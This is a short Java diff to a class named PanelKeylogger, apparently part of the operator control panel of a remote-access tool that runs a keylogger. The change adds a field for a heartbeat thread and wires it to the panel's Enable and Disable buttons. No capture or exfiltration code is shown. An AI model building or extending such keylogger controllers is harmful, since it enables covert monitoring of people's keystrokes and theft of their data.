@@ -26,6 +26,7 @@ public class PanelKeylogger extends BaseControlPanel {
 	private final ButtonGroup buttonGroup = new ButtonGroup();
 	private JCheckBox chckbxDeleteCharOn;
 	private Style title;
+	private HeartbeatThread hb;
 
 	public PanelKeylogger() {
 		
@@ -36,7 +37,8 @@ public class PanelKeylogger extends BaseControlPanel {
 		JToggleButton tglbtnEnable = new JToggleButton("Enable");
 		tglbtnEnable.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				new Thread(new HeartbeatThread(getServer(), PanelKeylogger.this)).start();
+				hb = new HeartbeatThread(getServer());
+				new Thread(hb).start();
 			}
 		});
 		buttonGroup.add(tglbtnEnable);
@@ -44,7 +46,8 @@ public class PanelKeylogger extends BaseControlPanel {
 		JToggleButton tglbtnDisable = new JToggleButton("Disable");
 		tglbtnDisable.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-					
+				hb.toggle();
+				hb = null;
 			}
 		});
 		buttonGroup.add(tglbtnDisable);
